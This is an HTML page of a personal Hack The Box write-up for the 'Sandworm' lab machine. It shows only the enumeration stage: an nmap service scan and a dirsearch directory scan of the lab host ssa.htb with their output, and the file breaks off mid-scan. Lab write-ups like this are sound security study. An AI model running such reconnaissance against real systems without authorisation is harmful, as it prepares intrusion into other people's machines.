@@ -1,0 +1,1433 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Scrambled" href="../scrambled/scrambled.html" /><link rel="prev" title="Outdated" href="../outdated/outdated.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Sandworm - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../administrator/administrator.html">Administrator</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../thefrizz/thefrizz.html">The Frizz</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/code/code.html">Code</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/dog/dog.html">Dog</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/escapetwo/escapetwo.html">Escape Two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="sandworm.png" src="../../../../_images/sandworm.png" /></p>
+<section id="sandworm">
+<h1>Sandworm<a class="headerlink" href="#sandworm" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.10.11.218<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-07-15<span class="w"> </span><span class="m">10</span>:28<span class="w"> </span>IST
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>ssa.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.218<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.035s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">997</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
+PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE<span class="w">  </span>VERSION
+<span class="m">22</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssh<span class="w">      </span>OpenSSH<span class="w"> </span><span class="m">8</span>.9p1<span class="w"> </span>Ubuntu<span class="w"> </span>3ubuntu0.1<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="m">18</span>:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">     </span>nginx<span class="w"> </span><span class="m">1</span>.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Did<span class="w"> </span>not<span class="w"> </span>follow<span class="w"> </span>redirect<span class="w"> </span>to<span class="w"> </span>https://ssa.htb/
+<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="m">443</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssl/http<span class="w"> </span>nginx<span class="w"> </span><span class="m">1</span>.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>SSA/organizationName<span class="o">=</span>Secret<span class="w"> </span>Spy<span class="w"> </span>Agency/stateOrProvinceName<span class="o">=</span>Classified/countryName<span class="o">=</span>SA
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2023</span>-05-04T18:03:25
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2050</span>-09-19T18:03:25
+<span class="p">|</span>_http-title:<span class="w"> </span>Secret<span class="w"> </span>Spy<span class="w"> </span>Agency<span class="w"> </span><span class="p">|</span><span class="w"> </span>Secret<span class="w"> </span>Security<span class="w"> </span>Service
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">14</span>.87<span class="w"> </span>seconds
+</pre></div>
+</div>
+<p><img alt="cert.png" src="../../../../_images/cert.png" /><br />
+<img alt="flask.png" src="../../../../_images/flask.png" /><br />
+<img alt="wap.png" src="../../../../_images/wap3.png" /></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>-r<span class="w"> </span>-u<span class="w"> </span>https://ssa.htb<span class="w"> </span>-b
+
+<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
+<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>
+
+Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>
+
+Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/ssa.htb/_23-07-15_11-54-48.txt
+
+Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-23-07-15_11-54-48.log
+
+Target:<span class="w"> </span>https://ssa.htb/
+
+<span class="o">[</span><span class="m">11</span>:54:48<span class="o">]</span><span class="w"> </span>Starting:
+<span class="o">[</span><span class="m">11</span>:54:55<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>5KB<span class="w"> </span>-<span class="w"> </span>/about
+<span class="o">[</span><span class="m">11</span>:54:56<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">  </span>227B<span class="w">  </span>-<span class="w"> </span>/admin<span class="w">  </span>-&gt;<span class="w">  </span>/login?next<span class="o">=</span>%2Fadmin
+<span class="o">[</span><span class="m">11</span>:55:05<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>3KB<span class="w"> </span>-<span class="w"> </span>/contact
